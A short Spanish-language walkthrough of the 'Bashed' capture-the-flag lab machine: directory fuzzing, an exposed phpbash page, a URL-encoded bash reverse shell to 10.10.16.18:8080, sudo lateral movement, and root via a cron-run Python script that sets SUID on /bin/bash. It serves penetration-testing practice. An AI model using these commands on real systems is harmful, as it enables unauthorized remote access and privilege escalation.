Enumeración

Explotación

Fuzzing encuentra una ruta con un RCE: http://bashed/dev/phpbash.min.php

dirb http://bashed:80

Rev_Shell desde web hay que encodear caracteres especiales: & -> %26

bash -c "bash -i >%26 /dev/tcp/10.10.16.18/8080 0>%261"
nc -nlvp 8080

Movimiento lateral (www-data -> scriptmanager)

Sudoers: Podemos ejecutar todos los comandos como el usuario scriptmanager

sudo -l 
sudo -u scriptmanager whoami 
sudo -u scriptmanager /bin/bash # Obtenemos una shell como usuario scriptmanager

Escalada de Privilegios

Enumerar archivos y directorios donde el propietario es scriptmanager

find / -user scriptmanager 2>/dev/null | grep -v "proc"

Mirando la información de los archivos en el directorio scripts se observa que test.py parece ejecutarse cada minuto e intuimos que como root

Comprobar fechas de modificación de los ficheros

stat /scripts/test.py
stat /scripts/test.txt

Se puede obtener una shell como root modificando test.py

nano test.py

import os
# Si root lo ejecuta y proporciona permisos SUID a la bash
os.system("chmod u+s /bin/bash")

Monitorizar permisos para esperar a que se ejecute la tarea cron

# n1 -> cada segundo
watch -n1 ls -l /bin/bash

Conectarnos como root

bash -p
